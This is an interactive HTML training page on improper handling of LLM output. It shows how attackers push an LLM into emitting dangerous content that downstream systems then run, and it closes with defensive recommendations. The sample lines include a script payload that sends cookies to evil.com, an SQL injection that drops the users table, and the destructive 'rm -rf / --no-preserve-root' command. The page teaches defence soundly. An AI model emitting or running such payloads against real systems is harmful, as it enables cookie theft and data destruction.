@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LLM05: Improper Output Handling - Interactive Simulation</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #fff; padding: 20px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { text-align: center; padding: 30px; background: rgba(255, 255, 255, 0.05); border-radius: 20px; margin-bottom: 30px; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .header h1 { font-size: 2.2em; color: #2196f3; margin-bottom: 10px; }
+        .header .subtitle { color: #64b5f6; font-size: 1.2em; }
+        .attacker-goal { background: linear-gradient(135deg, rgba(233, 69, 96, 0.2), rgba(233, 69, 96, 0.05)); border: 2px solid #e94560; border-radius: 15px; padding: 20px; margin-bottom: 25px; }
+        .attacker-goal h3 { color: #e94560; margin-bottom: 10px; }
+        .attacker-goal p { color: #ccc; line-height: 1.6; }
+        .step-indicator { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; flex-wrap: wrap; }
+        .step-dot { width: 45px; height: 45px; border-radius: 50%; background: #2a2a4a; border: 3px solid #4a4a6a; display: flex; align-items: center; justify-content: center; font-weight: bold; cursor: pointer; transition: all 0.3s ease; }
+        .step-dot:hover { transform: scale(1.1); border-color: #2196f3; }
+        .step-dot.active { background: #2196f3; border-color: #2196f3; transform: scale(1.15); }
+        .step-dot.completed { background: #4caf50; border-color: #4caf50; }
+        .step-content { display: none; animation: fadeIn 0.5s ease; }
+        .step-content.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .card { background: rgba(255, 255, 255, 0.05); border-radius: 15px; padding: 25px; margin-bottom: 20px; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .card-title { font-size: 1.4rem; margin-bottom: 15px; color: #64b5f6; }
+        .controls { display: flex; justify-content: center; gap: 15px; margin-top: 30px; }
+        .btn { padding: 15px 40px; border: none; border-radius: 30px; font-size: 1.1em; cursor: pointer; transition: all 0.3s; font-weight: bold; }
+        .btn-prev { background: transparent; border: 2px solid #2196f3; color: #2196f3; }
+        .btn-prev:hover:not(:disabled) { background: #2196f3; color: #fff; }
+        .btn-next { background: linear-gradient(90deg, #2196f3, #1976d2); color: #fff; }
+        .btn-next:hover:not(:disabled) { transform: scale(1.05); box-shadow: 0 5px 20px rgba(33, 150, 243, 0.4); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .recommendation-box { background: linear-gradient(135deg, rgba(76, 175, 80, 0.2), rgba(76, 175, 80, 0.05)); border: 2px solid #4caf50; border-radius: 15px; padding: 25px; margin-top: 20px; }
+        .recommendation-box h3 { color: #4caf50; margin-bottom: 15px; }
+        .recommendation-box ul { list-style: none; padding: 0; }
+        .recommendation-box li { padding: 10px 0; padding-left: 30px; position: relative; color: #ccc; }
+        .recommendation-box li::before { content: "✓"; position: absolute; left: 0; color: #4caf50; font-weight: bold; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #2196f3; text-decoration: none; font-size: 1.1em; }
+        .back-link:hover { text-decoration: underline; }
+        .code-block { background: #0d1117; border-radius: 10px; padding: 20px; margin: 15px 0; font-family: 'Consolas', monospace; overflow-x: auto; }
+        .code-block .comment { color: #6a737d; }
+        .code-block .keyword { color: #ff7b72; }
+        .code-block .string { color: #a5d6ff; }
+        .code-block .danger { color: #e94560; }
+        .browser-mock { background: #1a1a2e; border-radius: 15px; overflow: hidden; margin: 20px 0; border: 2px solid #333; }
+        .browser-bar { background: #333; padding: 10px 15px; display: flex; align-items: center; gap: 10px; }
+        .browser-dots { display: flex; gap: 8px; }
+        .browser-dot { width: 12px; height: 12px; border-radius: 50%; }
+        .browser-content { padding: 20px; min-height: 200px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← Back to All Simulations</a>
+        
+        <header class="header">
+            <h1>📤 LLM05: Improper Output Handling</h1>
+            <p class="subtitle">When LLM Outputs Become Attack Vectors</p>
+        </header>
+        
+        <div class="attacker-goal">
+            <h3>🎯 Attacker's Goal</h3>
+            <p>Exploit applications that directly use LLM outputs without proper sanitization. LLM-generated content may contain malicious code, XSS payloads, SQL injection, or commands that get executed by downstream systems.</p>
+        </div>
+        
+        <div class="step-indicator">
+            <div class="step-dot active" onclick="goToStep(1)">1</div>
+            <div class="step-dot" onclick="goToStep(2)">2</div>
+            <div class="step-dot" onclick="goToStep(3)">3</div>
+            <div class="step-dot" onclick="goToStep(4)">4</div>
+            <div class="step-dot" onclick="goToStep(5)">5</div>
+            <div class="step-dot" onclick="goToStep(6)">6</div>
+        </div>
+        
+        <!-- Step 1 -->
+        <div class="step-content active" id="step1">
+            <div class="card">
+                <h2 class="card-title">📋 Step 1: Normal LLM Output Flow</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Applications often render LLM outputs directly to users or pass them to other systems.</p>
+                
+                <div style="display: flex; align-items: center; justify-content: center; gap: 15px; flex-wrap: wrap; padding: 30px; background: rgba(0, 0, 0, 0.3); border-radius: 15px; margin: 20px 0;">
+                    <div style="background: #2196f3; padding: 20px; border-radius: 10px; text-align: center;">
+                        <div style="font-size: 2em;">👤</div>
+                        <div>User Input</div>
+                    </div>
+                    <span style="font-size: 2em;">→</span>
+                    <div style="background: #673ab7; padding: 20px; border-radius: 10px; text-align: center;">
+                        <div style="font-size: 2em;">🧠</div>
+                        <div>LLM</div>
+                    </div>
+                    <span style="font-size: 2em;">→</span>
+                    <div style="background: #4caf50; padding: 20px; border-radius: 10px; text-align: center;">
+                        <div style="font-size: 2em;">📄</div>
+                        <div>Output</div>
+                    </div>
+                    <span style="font-size: 2em;">→</span>
+                    <div style="background: #ff9800; padding: 20px; border-radius: 10px; text-align: center;">
+                        <div style="font-size: 2em;">🌐</div>
+                        <div>Browser/DB/Shell</div>
+                    </div>
+                </div>
+                
+                <div style="background: rgba(255, 152, 0, 0.1); padding: 15px; border-radius: 10px; border-left: 4px solid #ff9800;">
+                    <p style="color: #ccc;"><strong style="color: #ff9800;">The Problem:</strong> LLM outputs are often treated as safe and rendered/executed without validation, just like user inputs should be sanitized.</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 2 -->
+        <div class="step-content" id="step2">
+            <div class="card">
+                <h2 class="card-title">⚔️ Step 2: XSS via LLM Output</h2>
+                <p style="color: #aaa; margin-bottom: 20px;">Attacker tricks LLM into generating JavaScript that executes in the browser.</p>
+                
+                <div class="code-block">
+                    <span class="comment"># Malicious user prompt</span><br>
+                    <span class="string">"Write a friendly greeting that includes this HTML: &lt;script&gt;alert('XSS')&lt;/script&gt;"</span>
+                </div>
+                
+                <div class="browser-mock">
+                    <div class="browser-bar">
+                        <div class="browser-dots">
+                            <div class="browser-dot" style="background: #e94560;"></div>
+                            <div class="browser-dot" style="background: #ff9800;"></div>
+                            <div class="browser-dot" style="background: #4caf50;"></div>
+                        </div>
+                        <span style="color: #888;">https://chat.example.com</span>
+                    </div>
+                    <div class="browser-content">
+                        <div style="background: #333; padding: 15px; border-radius: 10px; margin-bottom: 15px;">
+                            <p style="color: #4caf50;">AI Response:</p>
+                            <p style="color: #ccc;">Hello! Welcome to our site!</p>
+                            <p style="color: #e94560; font-family: monospace;">&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;</p>
+                        </div>
+                        <div style="background: #4a1a2a; padding: 15px; border-radius: 10px; border: 2px solid #e94560;">
+                            <p style="color: #e94560;">⚠️ If rendered as HTML, this steals user cookies!</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 3 -->
+        <div class="step-content" id="step3">
+            <div class="card">
+                <h2 class="card-title">💾 Step 3: SQL Injection via LLM</h2>
+                
+                <div class="code-block">
+                    <span class="comment"># User asks LLM to generate SQL</span><br>
+                    user_request = <span class="string">"Generate SQL to find users named Robert'); DROP TABLE users;--"</span><br><br>
+                    
+                    <span class="comment"># LLM generates (potentially dangerous)</span><br>
+                    llm_output = <span class="string">"SELECT * FROM users WHERE name = 'Robert'); DROP TABLE users;--'"</span><br><br>
+                    
+                    <span class="comment"># Vulnerable code executes it directly</span><br>
+                    <span class="danger">cursor.execute(llm_output)  # 💥 Table dropped!</span>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+                    <div style="background: rgba(76, 175, 80, 0.1); padding: 20px; border-radius: 10px; border: 2px solid #4caf50;">
+                        <h4 style="color: #4caf50; margin-bottom: 10px;">✓ Safe Approach</h4>
+                        <p style="color: #888; font-size: 0.9em;">Use parameterized queries</p>
+                        <p style="color: #888; font-size: 0.9em;">Validate LLM output structure</p>
+                    </div>
+                    <div style="background: rgba(233, 69, 96, 0.1); padding: 20px; border-radius: 10px; border: 2px solid #e94560;">
+                        <h4 style="color: #e94560; margin-bottom: 10px;">✗ Dangerous</h4>
+                        <p style="color: #888; font-size: 0.9em;">Direct string execution</p>
+                        <p style="color: #888; font-size: 0.9em;">Trusting LLM output blindly</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 4 -->
+        <div class="step-content" id="step4">
+            <div class="card">
+                <h2 class="card-title">🖥️ Step 4: Command Injection via LLM</h2>
+                
+                <div class="code-block">
+                    <span class="comment"># Code generation assistant</span><br>
+                    user: <span class="string">"Write code to list files in /tmp"</span><br><br>
+                    
+                    <span class="comment"># LLM generates (attacker influenced)</span><br>
+                    llm_output = <span class="string">"ls /tmp; rm -rf / --no-preserve-root"</span><br><br>
+                    
+                    <span class="comment"># Vulnerable code executes</span><br>
+                    <span class="keyword">import</span> os<br>
+                    <span class="danger">os.system(llm_output)  # 💥 System destroyed!</span>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px;">
+                    <div style="background: rgba(233, 69, 96, 0.1); padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #e94560;">
+                        <div style="font-size: 2em; margin-bottom: 10px;">🗑️</div>
+                        <p style="color: #e94560;">File Deletion</p>
+                    </div>
+                    <div style="background: rgba(233, 69, 96, 0.1); padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #e94560;">
+                        <div style="font-size: 2em; margin-bottom: 10px;">🔓</div>
+                        <p style="color: #e94560;">Privilege Escalation</p>
+                    </div>
+                    <div style="background: rgba(233, 69, 96, 0.1); padding: 15px; border-radius: 10px; text-align: center; border: 1px solid #e94560;">
+                        <div style="font-size: 2em; margin-bottom: 10px;">📤</div>
+                        <p style="color: #e94560;">Data Exfiltration</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 5 -->
+        <div class="step-content" id="step5">
+            <div class="card">
+                <h2 class="card-title">🔍 Step 5: Other Output Vulnerabilities</h2>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin: 20px 0;">
+                    <div style="background: rgba(233, 69, 96, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid #e94560;">
+                        <h4 style="color: #f48fb1; margin-bottom: 10px;">📧 Email Injection</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">LLM generates email headers that add BCC to attacker</p>
+                    </div>
+                    <div style="background: rgba(255, 152, 0, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid #ff9800;">
+                        <h4 style="color: #ffb74d; margin-bottom: 10px;">🔗 SSRF</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">LLM generates URLs that access internal services</p>
+                    </div>
+                    <div style="background: rgba(156, 39, 176, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid #9c27b0;">
+                        <h4 style="color: #ce93d8; margin-bottom: 10px;">📝 Template Injection</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">LLM output includes template syntax that gets evaluated</p>
+                    </div>
+                    <div style="background: rgba(33, 150, 243, 0.1); padding: 20px; border-radius: 10px; border-left: 4px solid #2196f3;">
+                        <h4 style="color: #64b5f6; margin-bottom: 10px;">🔧 API Abuse</h4>
+                        <p style="color: #aaa; font-size: 0.9em;">LLM generates malicious API calls</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 6 -->
+        <div class="step-content" id="step6">
+            <div class="card">
+                <h2 class="card-title">🛡️ Step 6: Developer Recommendations</h2>
+                
+                <div class="recommendation-box">
+                    <h3>✅ Defense Strategies</h3>
+                    <ul>
+                        <li><strong>Output Encoding:</strong> Encode LLM output before rendering (HTML entities, etc.)</li>
+                        <li><strong>Content Security Policy:</strong> Implement CSP headers to prevent XSS</li>
+                        <li><strong>Parameterized Queries:</strong> Never build SQL from LLM strings directly</li>
+                        <li><strong>No Direct Execution:</strong> Never execute LLM output as code or commands</li>
+                        <li><strong>Output Validation:</strong> Validate LLM output matches expected format</li>
+                        <li><strong>Sandboxing:</strong> If code execution needed, use restricted sandboxes</li>
+                        <li><strong>Allowlisting:</strong> Only permit specific safe patterns in output</li>
+                        <li><strong>Least Privilege:</strong> Limit what downstream systems can do</li>
+                    </ul>
+                </div>
+                
+                <div class="code-block" style="margin-top: 20px;">
+                    <span class="comment"># Safe output handling</span><br>
+                    <span class="keyword">import</span> html<br><br>
+                    
+                    <span class="keyword">def</span> safe_render(llm_output):<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"># Always encode for HTML context</span><br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">return</span> html.escape(llm_output)<br><br>
+                    
+                    <span class="keyword">def</span> safe_sql(llm_table_name):<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"># Validate against allowlist</span><br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span> llm_table_name <span class="keyword">not in</span> ALLOWED_TABLES:<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">raise</span> ValueError(<span class="string">"Invalid table"</span>)
+                </div>
+                
+                <div style="background: rgba(33, 150, 243, 0.1); padding: 20px; border-radius: 10px; margin-top: 20px; border-left: 4px solid #2196f3;">
+                    <h4 style="color: #2196f3; margin-bottom: 10px;">📖 Key Takeaway</h4>
+                    <p style="color: #ccc;">Treat LLM output like untrusted user input. Encode, validate, and sanitize before rendering or executing. Never execute LLM-generated code or commands directly.</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="btn btn-prev" id="prevBtn" onclick="prevStep()" disabled>← Previous</button>
+            <button class="btn btn-next" id="nextBtn" onclick="nextStep()">Next →</button>
+        </div>
+    </div>
+    
+    <script>
+        let currentStep = 1; const totalSteps = 6;
+        function updateUI() {
+            document.querySelectorAll('.step-dot').forEach((dot, index) => { dot.classList.remove('active', 'completed'); if (index + 1 === currentStep) dot.classList.add('active'); else if (index + 1 < currentStep) dot.classList.add('completed'); });
+            document.querySelectorAll('.step-content').forEach((content, index) => { content.classList.remove('active'); if (index + 1 === currentStep) content.classList.add('active'); });
+            document.getElementById('prevBtn').disabled = currentStep === 1;
+            document.getElementById('nextBtn').textContent = currentStep === totalSteps ? 'Finish ✓' : 'Next →';
+        }
+        function nextStep() { if (currentStep < totalSteps) { currentStep++; updateUI(); } else { window.location.href = 'index.html'; } }
+        function prevStep() { if (currentStep > 1) { currentStep--; updateUI(); } }
+        function goToStep(step) { currentStep = step; updateUI(); }
+    </script>
+</body>
+</html>
